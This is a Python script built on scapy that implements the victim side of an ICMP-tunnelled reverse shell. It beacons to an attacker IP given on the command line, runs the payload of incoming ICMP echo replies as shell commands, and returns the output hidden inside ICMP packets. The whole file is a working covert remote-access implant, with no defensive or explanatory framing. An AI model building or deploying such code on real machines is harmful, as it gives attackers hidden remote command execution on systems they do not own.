from scapy.all import *
import subprocess
import sys

attacker_ip = sys.argv[1]


def send_icmp_to_attacker():
    packet = IP(dst=attacker_ip) / ICMP(id=10, type=8)
    send(packet)
    print(f"sent to attacker ip at: {attacker_ip}")


# ICMP id 10 = 0xa
def check_packet(packet):
    try:
        if packet.haslayer(ICMP) and packet[ICMP].type == 0:
            if packet[ICMP].id == 10 and packet[Raw].load:
                if packet[Ether].src != get_if_hwaddr("eth0"):
                    result = subprocess.Popen(
                        packet[Raw].load,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                    )

                    # Continuously read output and error
                    while True:
                        output = result.stdout.readline()
                        if output == "" and result.poll() is not None:
                            break
                        if output:
                            if output.strip() == "":
                                reply_packet = (
                                    IP(dst=packet[IP].src)
                                    / ICMP(id=10, type=0)
                                    / Raw(load="s")
                                )
                                send(reply_packet)
                            else:
                                reply_packet = (
                                    IP(dst=packet[IP].src)
                                    / ICMP(id=10, type=0)
                                    / Raw(load=output.strip())
                                )
                                send(reply_packet)
                                print(output.strip())

                    err = result.stderr.read()
                    if err:
                        reply_packet = (
                            IP(dst=packet[IP].src)
                            / ICMP(id=10, type=0)
                            / Raw(load=err.strip())
                        )
                        send(reply_packet)
                        # print(err.strip())

                    else:
                        reply_packet = (
                            IP(dst=packet[IP].src) /
                            ICMP(id=10, type=0) / Raw()
                        )
                        send(reply_packet)

    except Exception as e:
        pass


def main():
    send_icmp_to_attacker()
    sniff(prn=check_packet)


if __name__ == "__main__":
    main()
